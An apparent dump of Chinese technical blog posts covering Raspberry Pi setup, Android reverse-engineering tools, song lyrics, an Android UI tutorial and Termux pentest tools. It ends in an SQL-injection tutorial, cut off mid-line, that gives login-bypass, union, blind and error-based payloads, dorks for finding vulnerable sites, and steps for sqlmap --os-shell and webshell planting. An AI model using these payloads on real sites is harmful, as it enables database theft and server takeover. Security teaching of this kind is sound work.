/boot/config.txt\n\n\tstart_x=1\n\tgpu_mem=256\n\n[树莓派摄像头](https://pan.baidu.com/s/1wafsFY7_8iuQZm0QX4QJug)  \n密码:6pig\n\n## 树莓派wiki系统\n\n[docker安装](http://www.runoob.com/docker/ubuntu-docker-install.html)  \n[wiki.js](https://github.com/Requarks/wiki)  \n\nconfig and docker\nTTTTTTTTTTTTTT\nwikijs\n\ndocker-compose  \n\n\tsudo pip install docker-compose\n\tpip install request\n\n\n\n## LINKS\n\n[资源下载](http://shumeipai.nxez.com/download)  \n[使用VNC远程登陆树莓派](https://blog.csdn.net/u012952807/article/details/70225700)  \n[树莓派手动指定静态IP和DNS 终极解决大法](https://blog.csdn.net/u013178472/article/details/78574878)  \n[Multi-Cam Module Error](https://raspberrypi.stackexchange.com/questions/51322/multi-cam-module-error)  \n[用wiki.js搭建自己的wiki知识库](https://blog.csdn.net/michael_llh/article/details/80210951)  \n\n[[经验] 用树莓派2控制一个LED灯](http://bbs.elecfans.com/jishu_542880_1_1.html)  \n[树莓派GPIO最入门教程：先从控制一个LED小灯开始](https://www.jianshu.com/p/27104b0c5da1)  \n\n[树莓派 Learning 003 --- GPIO 001 --- 点亮LED](https://blog.csdn.net/github_35160620/article/details/52140967)  \n\n[引脚图](https://image.baidu.com/search/detail?ct=503316480&z=0&ipn=d&word=%E6%A0%91%E8%8E%93%E6%B4%BE%E9%92%88%E8%84%9A%E5%9B%BE&hs=2&pn=5&spn=0&di=9211195430&pi=0&rn=1&tn=baiduimagedetail&is=0%2C0&ie=utf-8&oe=utf-8&cl=2&lm=-1&cs=2469181244%2C1318570245&os=2596068280%2C2211848993&simid=1258434643%2C4156524171&adpicid=0&lpn=0&ln=30&fr=ala&fm=&sme=&cg=&bdtype=11&oriquery=%E6%A0%91%E8%8E%93%E6%B4%BE%E9%92%88%E8%84%9A%E5%9B%BE&objurl=http%3A%2F%2Fupload-images.jianshu.io%2Fupload_images%2F80704-7a5b8c35888d93b8.jpg&fromurl=ippr_z2C%24qAzdH3FAzdH3Fooo_z%26e3B3twgfi7_z%26e3Bv54AzdH3FrAzdH3Fuv00v8vukkw1&gsm=0&islist=&querylist=)  \n\n[树莓派 3 + L298N模块 驱动直流电机](https://www.jianshu.com/p/775b4fb2c98d)  \n\n[树莓派3 GPIO 介绍及 RPi.GPIO 库的使用](https://www.jianshu.com/p/1db0b3e4fd56)  \n\n[Sunny的树莓派小车DIY教程（附视频）](http://shumeipai.nxez.com/2015/11/08/raspberry-pi-car-diy-tutorials-by-sunny.html)  \n\n\n","tags":["树莓派"],"categories":["树莓派"]},{"title":"安卓逆向工具/使用命令","url":"/post/3046188699.html","content":"\n\t链接: https://pan.baidu.com/s/1WZSw1HRk2N_RNgZGYZVtVg 提取码: 96x7 \n\n## 反汇编工具\n\n**apktool**  \n[apktool下载](https://bitbucket.org/iBotPeaches/apktool/downloads/)  \n[apktool文档](https://ibotpeaches.github.io/Apktool/documentation/)  \n\n获取资源文件  \n\n\tjava -jar apktool.jar d -f <xx.apk> -o <XX>\n\n\tjava -jar apktool_2.3.3.jar d -f xx.apk -o XX\n\n\n\tjava -jar apktool.jar -r d xx.apk -o xx  //-r忽略资源文件\n\tjava -jar apktool.jar b xx \n\n\n\n**dex2jar**  \n[dex2jar下载](https://sourceforge.net/projects/dex2jar/files/)  \n\n获取java代码  \n\n\t1.把apk的后缀名修改成.zip\n\t2.解压\n\t3.获取classes.dex(可能是安卓64k包所以会有多个classes.dex，有的时候会有好几个，可能因为混淆，或者加了壳，现在裸奔的应用很少了吧)\n\t4.把classes.dex 文件放到 dex2jar 文件夹内\n\n\t命令：\n\n\td2j-dex2jar classes.dex // 会生成classes-dex2jar.jar\n\n\tmac:\n\tsh d2j-dex2jar.sh classes.dex\n\n\n## 签名工具\n\n**signapk**\n[signapk](https://github.com/as0ler/Android-Tools/tree/master/Autosign/Auto-Sign)  \n\n\tjava -jar signapk.jar testkey.x509.pem testkey.pk8 xx.apk test_signed.apk\n\n## 静态分析工具\n\n**jd-gui**  \n[jd-gui下载](http://jd.benow.ca/)   \n查看代码工具  \n\n\t使用jd-gui打开classes-dex2jar.jar就可以看到源代码了\n\n**jadx**  \n[jadx下载](https://github.com/skylot/jadx/releases/tag/v0.7.1)   \n直接把apk拖进去就可以了  \n\n**Android Killer**  \n[Android Killer下载](https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip)  \n\n**010Editor**  \n\n**smalidea**  \n\n[smalidea下载](https://bitbucket.org/JesusFreke/smali/downloads/)  \n\n## 动态调试工具\n\n**Android Studio/Intellij IDEA**  \n\n**IDA**  \n\n## 脱壳\n\n**ZjDroid**  \n\n[ZjDroid github](https://github.com/halfkiss/ZjDroid)  \n\n## 遇到的一些问题\n\n使用dex2jar会提示没有权限  \n> d2j-dex2jar.sh: line 36: ./d2j_invoke.sh: Permission denied  \n\n使用命令把dex2jar提升下权限就可以了  \n\n\tsudo chmod -R 777 dex2jar-2.0\n\n## 相关链接\n\n[Android 反编译神器jadx的使用](https://blog.csdn.net/Fisher_3/article/details/78654450)  \n[Smalidea+IntelliJ IDEA/Android Studio动态调试安卓app教程](https://blog.csdn.net/linchaolong/article/details/51146492)  \n[ZjDroid工具介绍及脱壳详细示例](https://www.cnblogs.com/goodhacker/p/3961045.html)  \n[Android中Xposed框架篇---基于Xposed的一款脱壳神器ZjDroid工具原理解析](https://blog.csdn.net/jiangwei0910410003/article/details/52840602)  \n","tags":["android逆向"],"categories":["android逆向"]},{"title":"Android逆向工具介绍","url":"/post/1830912127.html","content":"\n\n## 反汇编工具\n\n- **Apktool/ShakaApktool**\n\n[apktool Download](https://bitbucket.org/iBotPeaches/apktool/downloads/)  \n\n[ShakaApktool Github](https://github.com/rover12421/ShakaApktool) 作者已经不更新了  \n\n- **smali/baksmali**\n\n- **dex2jar**\n\n- **enjarify**\n\n## 静态分析工具\n\n- **android-classyshark**\n\n- **jadx**\n\n- **JD-GUI**\n\n- **BytecodeViewer**\n\n- **Android Killer**\n\n[Android Killer下载](https://down.52pojie.cn/Tools/Android_Tools/AndroidKiller_v1.3.1.zip)  \n\n## 动态调试工具\n\n- **JEB**\n\n- **jdb**\n\n- **Android Studio/Intellij IDEA**\n\n- **gdb**\n\n- **IDA Pro**\n\n## Hook框架\n\n- **Cydia Substrate**\n\n- **Xposed**\n\n- **adbi**\n\n- **Frida**\n\n\n## 沙盒环境\n\n- **DroidBox**\n","tags":["android逆向"],"categories":["android逆向"]},{"title":"陶然四季","url":"/post/882445833.html","content":"\n<!-- <iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=29771932&auto=1&height=66\"></iframe> -->\n\n\n觉得歌词描绘的超美，歌曲也好听，旋律也轻松，最近超喜欢。\n\n> 歌词描述二十四节气，曲子是走的闲闲散散民谣的风格，悠然惬意潇洒。\n\n\n\t陶然四季 - 橙翼\n\n\t作词：择荇\n\n\t作曲：安九\n\n\t立春时 北国未解冻的平原\n\n\t第一尾鱼跃出倒春寒的湖面\n\n\t快小满 牵耕牛走过黄土上的梯田\n\n\t偶尔也陪蜻蜓寻着小荷尖尖\n\n\t白露后酒巷 卖一碗月夜婵娟\n\n\t水乡的桂花 入口最缠绵\n\n\t小雪在海港靠岸 初冬不太明显\n\n\t走走停停 又是一年\n\n\t清欢百味 不过粗茶饭\n\n\t风雨满山川 莫道行路难\n\n\t阴晴冷暖 无非布衣衫\n\n\t做个凡夫俗子也超然\n\n\t谷雨前 收集春蚕缚丝结茧\n\n\t是时候到河堤边放会儿纸鸢\n\n\t大暑中 草帽抛在稻香里蛙声一片\n\n\t摘把荷叶 等乌云涌出江边\n\n\t霜降的野菊 泡一朵挽留鸿雁\n\n\t向阳老城根儿 偷浮生半日闲\n\n\t大寒积雪满天山 腊八粥正甜\n\n\t熬满光阴 又是一年\n\n\t清欢百味 不过粗茶饭\n\n\t风雨满山川 莫道行路难\n\n\t阴晴冷暖 无非布衣衫\n\n\t做个凡夫俗子也超然\n\n\t酒止三杯 莫如饮半酣\n\n\t寒暑皆不管 温凉莫多贪\n\n\t岁月荏苒 且随遇而安\n\n\t渡个无忧四季最陶然\n","tags":["歌曲"],"categories":["biu"]},{"title":"android滑动监听事件折叠菜单","url":"/post/2984908294.html","content":"\n**效果如下**  \n\n![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/23/1.gif)\n\n## 思路\n\n1.定义两个title布局  \n2.监听ScrollView控件在下面布局不可见的时候显示第二个title布局  \n\n## 关键代码：\n\njava：  \n\n\tscrollView.setOnScrollChangeListener(new View.OnScrollChangeListener() {\n\t    @Override\n\t    public void onScrollChange(View view, int x, int y, int oldX, int oldY) {\n\t        Rect scrollRect = new Rect();\n\t        scrollView.getHitRect(scrollRect);\n\t        //子控件在可视范围内（至少有一个像素在可视范围内）\n\t        if (whiteLayout.getLocalVisibleRect(scrollRect)) {\n\t            whiteLayout.setVisibility(View.VISIBLE);\n\t            rl.setVisibility(View.INVISIBLE);\n\t        } else {\n\t            ////子控件完全不在可视范围内\n\t            whiteLayout.setVisibility(View.INVISIBLE);\n\t            rl.setVisibility(View.VISIBLE);\n\t        }\n\n\t    }\n\t});\n\n\n代码：  \n\nSVLisActivity.kt  \n\n    class SVLisActivity: AppCompatActivity() {\n    \n        @SuppressLint(\"NewApi\")\n        override fun onCreate(savedInstanceState: Bundle?) {\n            super.onCreate(savedInstanceState)\n            setContentView(R.layout.activity_svlis)\n            initLis()\n        }\n    \n        @RequiresApi(Build.VERSION_CODES.M)\n        fun initLis() {\n            scroll_view.setOnScrollChangeListener { view, i, i1, i2, i3 ->\n                var scrollRect = Rect()\n                scroll_view.getHitRect(scrollRect)\n                if (whiteLayout.getLocalVisibleRect(scrollRect)) {\n                    whiteLayout.visibility = View.VISIBLE\n                    title1.visibility = View.VISIBLE\n                    title2.visibility = View.GONE\n                } else {\n                    whiteLayout.visibility = View.INVISIBLE\n                    title1.visibility = View.GONE\n                    title2.visibility = View.VISIBLE\n                }\n            }\n        }\n    \n    }\n\nactivity_svlis.xml  \n\n    <LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n        android:orientation=\"vertical\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"match_parent\">\n    \n        <RelativeLayout\n            android:id=\"@+id/title1\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"45dp\">\n    \n            <ImageView\n                android:layout_width=\"20dp\"\n                android:layout_height=\"20dp\"\n                android:layout_centerVertical=\"true\"\n                android:layout_margin=\"10dp\"\n                android:src=\"@mipmap/ic_launcher\" />\n    \n            <TextView\n                android:layout_width=\"wrap_content\"\n                android:layout_height=\"wrap_content\"\n                android:layout_centerInParent=\"true\"\n                android:singleLine=\"true\"\n                android:text=\"标题\" />\n        </RelativeLayout>\n    \n        <RelativeLayout\n            android:id=\"@+id/title2\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"45dp\"\n            android:visibility=\"gone\">\n    \n            <ImageView\n                android:layout_width=\"20dp\"\n                android:layout_height=\"20dp\"\n                android:layout_centerVertical=\"true\"\n                android:layout_margin=\"10dp\"\n                android:src=\"@mipmap/ic_launcher\" />\n    \n            <LinearLayout\n                android:layout_width=\"wrap_content\"\n                android:layout_height=\"wrap_content\"\n                android:layout_centerInParent=\"true\">\n    \n                <ImageView\n                    android:layout_width=\"20dp\"\n                    android:layout_height=\"20dp\"\n                    android:layout_centerVertical=\"true\"\n                    android:layout_margin=\"10dp\"\n                    android:src=\"@mipmap/ic_launcher\" />\n    \n                <TextView\n                    android:layout_width=\"wrap_content\"\n                    android:layout_height=\"wrap_content\"\n                    android:text=\"2\"\n                    android:textColor=\"@android:color/black\"\n                    android:textSize=\"25dp\"\n                    android:textStyle=\"bold\" />\n    \n                <TextView\n                    android:layout_width=\"wrap_content\"\n                    android:layout_height=\"match_parent\"\n                    android:layout_gravity=\"center_vertical\"\n                    android:layout_marginLeft=\"5dp\"\n                    android:gravity=\"center_vertical\"\n                    android:text=\":\"\n                    android:textColor=\"@android:color/black\"\n                    android:textSize=\"20sp\"\n                    android:textStyle=\"bold\" />\n    \n                <TextView\n                    android:layout_width=\"wrap_content\"\n                    android:layout_height=\"wrap_content\"\n                    android:layout_marginLeft=\"5dp\"\n                    android:text=\"2\"\n                    android:textColor=\"@android:color/black\"\n                    android:textSize=\"25sp\"\n                    android:textStyle=\"bold\" />\n    \n                <ImageView\n                    android:layout_width=\"20dp\"\n                    android:layout_height=\"20dp\"\n                    android:layout_centerVertical=\"true\"\n                    android:layout_margin=\"10dp\"\n                    android:src=\"@mipmap/ic_launcher\" />\n            </LinearLayout>\n        </RelativeLayout>\n    \n        <View\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"0.5dp\"\n            android:background=\"@android:color/black\" />\n    \n        <ScrollView\n            android:id=\"@+id/scroll_view\"\n            android:layout_width=\"match_parent\"\n            android:layout_height=\"match_parent\">\n    \n            <LinearLayout\n                android:orientation=\"vertical\"\n                android:layout_width=\"match_parent\"\n                android:layout_height=\"match_parent\">\n    \n                <RelativeLayout\n                    android:id=\"@+id/whiteLayout\"\n                    android:layout_width=\"match_parent\"\n                    android:layout_height=\"wrap_content\"\n                    android:background=\"@android:color/white\"\n                    android:paddingLeft=\"35dp\"\n                    android:paddingRight=\"35dp\">\n    \n                    <RelativeLayout\n                        android:layout_width=\"match_parent\"\n                        android:layout_height=\"wrap_content\"\n                        android:padding=\"10dp\">\n    \n                        <RelativeLayout\n                            android:layout_width=\"match_parent\"\n                            android:layout_height=\"wrap_content\">\n    \n                            <LinearLayout\n                                android:id=\"@+id/scoreLayout\"\n                                android:layout_width=\"wrap_content\"\n                                android:layout_height=\"wrap_content\"\n                                android:layout_centerHorizontal=\"true\"\n                                android:orientation=\"horizontal\">\n    \n                                <TextView\n                                    android:id=\"@+id/score_a_tv\"\n                                    android:layout_width=\"wrap_content\"\n                                    android:layout_height=\"wrap_content\"\n                                    android:text=\"2\"\n                                    android:textColor=\"@android:color/black\"\n                                    android:textSize=\"35dp\"\n                                    android:textStyle=\"bold\" />\n    \n                                <TextView\n                                    android:layout_width=\"wrap_content\"\n                                    android:layout_height=\"match_parent\"\n                                    android:layout_gravity=\"center_vertical\"\n                                    android:layout_marginLeft=\"5dp\"\n                                    android:gravity=\"center_vertical\"\n                                    android:text=\":\"\n                                    android:textColor=\"@android:color/black\"\n                                    android:textSize=\"25sp\"\n                                    android:textStyle=\"bold\" />\n    \n                                <TextView\n                                    android:id=\"@+id/score_b_tv\"\n                                    android:layout_width=\"wrap_content\"\n                                    android:layout_height=\"wrap_content\"\n                                    android:layout_marginLeft=\"5dp\"\n                                    android:text=\"2\"\n                                    android:textColor=\"@android:color/black\"\n                                    android:textSize=\"35sp\"\n                                    android:textStyle=\"bold\" />\n                            </LinearLayout>\n    \n                            <LinearLayout\n                                android:layout_width=\"wrap_content\"\n                                android:layout_height=\"wrap_content\"\n                                android:layout_below=\"@id/scoreLayout\"\n                                android:layout_centerHorizontal=\"true\"\n                                android:orientation=\"vertical\">\n    \n                                <TextView\n                                    android:id=\"@+id/date_tv\"\n                                    android:layout_width=\"wrap_content\"\n                                    android:layout_height=\"wrap_content\"\n                                    android:layout_below=\"@id/scoreLayout\"\n                                    android:layout_gravity=\"center_horizontal\"\n                                    android:layout_marginTop=\"10dp\"\n                                    android:text=\"08/11 22:00\"\n                                    android:textColor=\"@android:color/black\"\n                                    android:textSize=\"10dp\" />\n    \n                                <TextView\n                                    android:id=\"@+id/desc_tv\"\n                                    android:layout_width=\"wrap_content\"\n                                    android:layout_height=\"wrap_content\"\n                                    android:layout_below=\"@id/scoreLayout\"\n                                    android:layout_gravity=\"center_horizontal\"\n                                    android:text=\"足总杯 半决赛\"\n                                    android:textColor=\"@android:color/black\"\n                                    android:textSize=\"10dp\" />\n    \n    \n                                <TextView\n                                    android:id=\"@+id/deadlines_tv\"\n                                    android:layout_width=\"80dp\"\n                                    android:layout_height=\"23dp\"\n                                    android:layout_marginLeft=\"9dp\"\n                                    android:layout_marginTop=\"10dp\"\n                                    android:gravity=\"center\"\n                                    android:text=\"30：00封盘\"\n                                    android:textColor=\"@color/colorAccent\"\n                                    android:textSize=\"10sp\"\n                                    android:textStyle=\"bold\"\n                                    android:visibility=\"visible\" />\n    \n                            </LinearLayout>\n                        </RelativeLayout>\n    \n                        <LinearLayout\n                            android:layout_width=\"wrap_content\"\n                            android:layout_height=\"wrap_content\"\n                            android:orientation=\"vertical\">\n    \n                            <ImageView\n                                android:id=\"@+id/team_a_iv\"\n                                android:layout_width=\"60dp\"\n                                android:layout_height=\"60dp\"\n                                android:layout_gravity=\"center_horizontal\"\n                                android:src=\"@mipmap/ic_launcher\" />\n    \n                            <TextView\n                                android:id=\"@+id/team_a_tv\"\n                                android:layout_width=\"wrap_content\"\n                                android:layout_height=\"wrap_content\"\n                                android:layout_gravity=\"center_horizontal\"\n                                android:layout_marginTop=\"5dp\"\n                                android:text=\"A队\"\n                                android:textColor=\"@android:color/black\" />\n                        </LinearLayout>\n    \n                        <LinearLayout\n                            android:layout_width=\"wrap_content\"\n                            android:layout_height=\"wrap_content\"\n                            android:layout_alignParentRight=\"true\"\n                            android:orientation=\"vertical\">\n    \n                            <ImageView\n                                android:id=\"@+id/team_b_iv\"\n                                android:layout_width=\"60dp\"\n                                android:layout_height=\"60dp\"\n                                android:layout_gravity=\"center_horizontal\"\n                                android:src=\"@mipmap/ic_launcher\" />\n    \n                            <TextView\n                                android:id=\"@+id/team_b_tv\"\n                                android:layout_width=\"wrap_content\"\n                                android:layout_height=\"wrap_content\"\n                                android:layout_gravity=\"center_horizontal\"\n                                android:layout_marginTop=\"5dp\"\n                                android:text=\"B队\"\n                                android:textColor=\"@android:color/black\" />\n                        </LinearLayout>\n                    </RelativeLayout>\n                </RelativeLayout>\n    \n                <View\n                    android:layout_width=\"match_parent\"\n                    android:layout_height=\"1000dp\" />\n            </LinearLayout>\n        </ScrollView>\n    </LinearLayout>\n\n\n\n[源码地址-homepage libray](https://github.com/tea9/dear_kotlin_code) \n---\n这个是用AppBarLayout实现的折叠菜单监听  \n\n\tAppBarLayout topLayout = getActivity().findViewById(R.id.topLayout);\n\t        topLayout.addOnOffsetChangedListener(new AppBarLayout.OnOffsetChangedListener() {\n\t            @Override\n\t            public void onOffsetChanged(AppBarLayout appBarLayout, int i) {\n\t                if (i == 0) {\n\t                    //展开状态\n\t                    Log.e(\"shaomiaomrootCL\", \"展开状态\");\n\t                    mPullToRefresh.setCanRefresh(true);\n\t                    mPullToRefresh.setCanLoadMore(false);\n\t                } else if (Math.abs(i) >= appBarLayout.getTotalScrollRange()) {\n\t//折叠状态\n\t                    Log.e(\"shaomiaomrootCL\", \"折叠状态\");\n\t                    mPullToRefresh.setCanRefresh(false);\n\t                    mPullToRefresh.setCanLoadMore(true);\n\t                } else {\n\t//中间状态\n\t                    Log.e(\"shaomiaomrootCL\", \"中间状态\");\n\t                    mPullToRefresh.setCanRefresh(false);\n\t                    mPullToRefresh.setCanLoadMore(false);\n\t                }\n\t            }\n\t        });\n\n## OTHER\n\n录屏软件：  \n\n[小熊录屏](https://www.coolapk.com/apk/com.duapps.recorder)  \n\n## LINK\n[如何监听CollapsingToolbarLayout的展开与折叠](https://www.2cto.com/kf/201702/598635.html)  ","tags":["android"],"categories":["android"]},{"title":"SSL和HTTPS","url":"/post/902500137.html","content":"\n## SSL和HTTPS\n\n加密技术只能保护你的会话所使用的信道。它保护通信不被窃听，甚至能够让你更加肯定正在交谈的两台计算机的身份，而我们所测试的是在通信末端的软件的行为。  \nHTTP和HTTPS之间唯一的区别在于HTTPS连接在初始化有额外的设置。它建立起一条安全信道，然后通过这条安全信道来发送标准的HTTP。你将会看到，测试HTTPS应用时，通常你需要做的唯一不同的事情就是在运行工具时额外增加一个命令行参数或配置选项。者对测试的影响确实不大。\n\n","tags":["tips"],"categories":["web安全"]},{"title":"URL中的大小写敏感","url":"/post/1353455041.html","content":"\n## URL中的大小写敏感\n\n\thttp://fred:wilma@www.example.com/private.asp?doc=3&part=4#footer\n\n1. 协议标示符 （http/https） 大小写不敏感 HTTP、http、hTtP  \n\n2. 用户ID和密码 （fred和wilma）可能大小写敏感 取决于你的服务器软件  \n\n3. 机器的名称（www.example.com） 不是大小写敏感 www.eXamplE.coM 或者其他大小写组合  \n\n4. 获取资源情况 （private.asp） ASP是Windows动态服务器扩展名 Windows服务器都不是大小写敏感的，因此/PRIvate.aSP可能也有效  \n","tags":["tips"],"categories":["web安全"]},{"title":"termux相关","url":"/post/3612980045.html","content":"\n## 前言：\n\nTermux是一款开源且不需要root，运行在Android终端上极其强大的linux模拟器，支持apt管理软件包，完美支持python,ruby,go,nodejs。本文使用termux搭建Nmap、Sqlmap、BBScan、subDomainsBrute、Hydra、RouterSploit等实现支持端口扫描、注入检测、子域名爆破、多协议弱口令爆破、路由器漏洞检测框架多种功能的Android手机渗透神器。  \n\n## LINKS\n\n- 下载地址\n\n[Termux GooglePlay](https://play.google.com/store/apps/details?id=com.termux)  \n\n[Termux Youtube](https://www.youtube.com/playlist?list=PLbg6BPamoIGbXR52TdQAJwTkeDw8E6hIf)  \n\n- 资料地址\n\n[链接:](https://pan.baidu.com/s/1dpdn0vvA-aKQPmJCRLgSxQ)  \n提取码: y27f  \n\n## 常用命令\n\n**Jupyter Notebook**  \n\n\tjupyter notebook --ip=0.0.0.0\n\n**Sqlmap**\n\n\tcd sqlmap\n\tpython2 sqlmap.py -h\n\n**whatportis**\nwhatportis是一款离线查询端口号对应服务的工具  \n\n\twhatportis 3306\n\n\n## LINKS\n\n[电脑通过ssh连接android手机上的termux](https://www.aliyun.com/jiaocheng/120639.html)  ","tags":["安全","termux"],"categories":["termux"]},{"title":"1.sql注入基础","url":"/post/2159052339.html","content":"\n## 目录\n<!-- MarkdownTOC -->\n\n- SQL注入原理\n\t- SQL注入原理-SQL注入产生原因\n\t- SQL注入原理-SQL注入核心原理\n- SQL注入的危害\n- mysql注入语句\n\t- mysql注入语句-mysql介绍\n\t- mysql注入语句-万能密码\n\t- mysql注入语句-注入语句例子\n- sql注入流程\n- MySQL手工注入方法\n- TIPS\n- 实例\n- 相关链接\n\n<!-- /MarkdownTOC -->\n\n\n## SQL注入原理\n\n### SQL注入原理-SQL注入产生原因\n\n>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。\n\n### SQL注入原理-SQL注入核心原理\n\n>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。\n\n> 简单概括：利用现有应用程序，将精心构造的SQL语句“注入”到后台数据库所执行的恶意操作\n\n---\n\n> 灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库->SQL注入漏洞\n\n## SQL注入的危害\n\n- 数据库信息泄露：数据库中存放的用户的隐私信息的泄漏。\n- 网页篡改：通过操作数据库对特定网页进行篡改。\n- 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。\n- 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。\n- 服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。\n- 破坏硬盘数据，瘫痪全系统\n\n\n## mysql注入语句\n### mysql注入语句-mysql介绍\n\n> MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。\n> MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。\n> MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。\n\n-- 摘自百度百科  \n\n\n### mysql注入语句-万能密码\n\n\t# 登录处正常的SQL语句：\n\tselect * from users where username= 'admin' and pwd = 'pass';\n\n\t# 万能密码：\n\t'or '1' = '1 \n\n\t# 带入用户输入参数\n\tselect * from users where username= ''or '1' = '1' and pwd = ''or '1' = '1';\n\n\t第一个 or 前面为 false 后面为 true -> true\n\tand 前面为 true 后面为 false -> false\n\t第二个 or 前面为 false 后面为 true -> true\n\n### mysql注入语句-注入语句例子\n\n\t# 利用构造1=2错误执行union后面的语句\n\tand 1=2 union select 1,2,3--\n\n\t# 利用mysql正则表达式为匹配当前用户是否为ro开头\n\tselect user() regexp '^ro'\n\n\t# 查询当前用户的ascii码是否为114（r）\n\tascii(substr(substr(select user()),1,1))=114\n\n\t# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒\n\tif(ascii(substr((select user()),1,1))=114,0,sleep(5))\n\n\t# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0\n\t(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)\n\n\t# 利用updatexml报错，返回版本信息\n\tupdatexml(1,concat(0x7e,(select @@version),0x7e),1)\n\n\n## sql注入流程\n\n1. **目标搜集：**  \n\t无特定目标：  \n\n\t\tinurl:php?id=\n\n\t有特定目标：  \n\n\t\tinurl:php?id= site:target.com\n\n\t工具爬取：  \n\n\t\tspider，对搜索引擎和目标网站的链接进行爬取\n\n2. **注入识别：**  \n\t手工简单识别：  \n\n\t\t'\n\t\tand 1=1 / and 1=2\n\t\tand '1' ='1 / and '1'='2\n\t\tand 1 like 1 / and 1 like 2\n\n\t工具识别：  \n\n\t\tsqlmap -m filename (filename中保存检测目标)\n\t\tsqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)\n\n\n3. **高级识别：**  \n\n\t扩展识别广度和深度：  \n\n\t\tsqlmap --level 增加测试级别，对header中相关参数也进行测试\n\t\tsqlmap -r filename(filename中为网站请求数据)\n\n\t利用工具提高识别效率：  \n\n\t\tBurpSuite + SqlMap\n\n\tTips:  \n\n\t\t可以在参数后键入 “*” 来确定想要测试的参数  \n\t\t可能出现注入的点：新闻、登录、搜索、留言......  \n\t\t站在开发的角度去寻找  \n\n4. **代码审计：**  \n\n\t搜索关键代码和函数  \n\n\t\t关键代码包括 $_GET/$_POST/$id/select/SELECT\n\n\t梳理业务流程  \n\n\n## MySQL手工注入方法\n\n**MySQL数据库结构**  \n\n- Mysql\n\t- 连接层\n\t\t- 通信协议\n\t\t- 线程\n\t\t- 验证\n\t- SQL层\n\t\t- 解析器\n\t\t- 授权\n\t\t- 优化器\n\t\t- 查询执行\n\t\t- 查询高速缓存\n\t\t- 查询日志记录\n\n**SQL层的功能**\t  \n\n1. 判断语法、语句、语义\n2. 数据库对象授权情况判断，授权失败不继续\n3. 解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式\n4. 优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”\n5. 执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式\n6. 将取数据的方式，交由下层（存储引擎层）进行处理\n7. 最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前\n8. 查询缓存：缓存之前查询的数据\n\n**MySQL内置库（>=5.7）**  \n\nmysql: 账户信息、权限信息、存储过程、event、时区等信息。  \n\nsys: 存储过程、自定义函数、视图帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）  \n\nperformance_schema: 用于收集数据库服务器性能参数  \n\ninformation_schema: 访问数据库元数据的方式，保存关于MySQL服务器所维护的所有其他数据库信息，如数据库名，数据库表，表的数据类型与访问权限等。\n\n**查询数据核心语法**  \n\n\t# 查库\n\tselect schema_name from information_schema.schemata;\n\n\t#查表\n\tselect table_name from information_schema.tables where table_schema=库名;\n\n\t#查列\n\tselect column_name from information_schema.columns where table_name=表名;\n\n\t#查数据\n\tselect 列名 from 库名.表名;\n\n**Tips**  \n\n提示1: 所有类型的sql注入，都是基于查库、表、列语句  \n提示2: 如果数据太多，导致无法返回查询结果：  \n\t查询的场景：可利用limit限定返回数量及为止，依次查询  \n\t`select username,password from security.users limit 0,1;`  \n\t回显数据的场景：* concat * 链接多个数据成为一条返回结果  \n\t`select group_concat(schema_name) from infromation_schema.schemata;`  \n提示3: 在一些场景，想要快速获取数据，需要借助工具，如：BurpSuite  \n\n**sql注入流程**  \n\n[思维导图](http://naotu.baidu.com/file/18232e9bd73bf191df5d048930c001bf?token=86fd9c0a184789f3)  \n\n- SQL注入\n\t- 信息搜集\n\t\t- 数据库类型\n\t\t\t- 报错信息 \n\t\t\t- 特有语句（不同数据库版本）\n\t\t- 数据库版本\n\t\t- 数据库用户\n\t\t- 判断数据库权限\n\t- 数据获取\n\t\t- 获取库信息\n\t\t\t- 获取当前库\n\t\t\t- 获取所有库\n\t\t- 获取表信息\n\t\t- 获取列信息\n\t\t- 获取数据\n\t- 提权\n\t\t- 根据数据库权限\n\t\t\t- 执行系统命令\n\t\t\t\t- 直接提权（\n\t\t\t\t\t- mssql：调用xp.cmdshell执行系统命令、\n\t\t\t\t\t- mysql：写木马到网站目录、\n\t\t\t\t\t- sqlmap  `--os-shell（os shell会上传两个文件一个木马  一个是创建文件 富于这个文件775的权限控制权限））`\n\t\t\t- 读文件\n\t\t\t\t- 读数据库配置文件,尝试远程连接\n\t\t\t\t- 读系统配置文件，搜集信息\n\t\t\t\t\t- `select 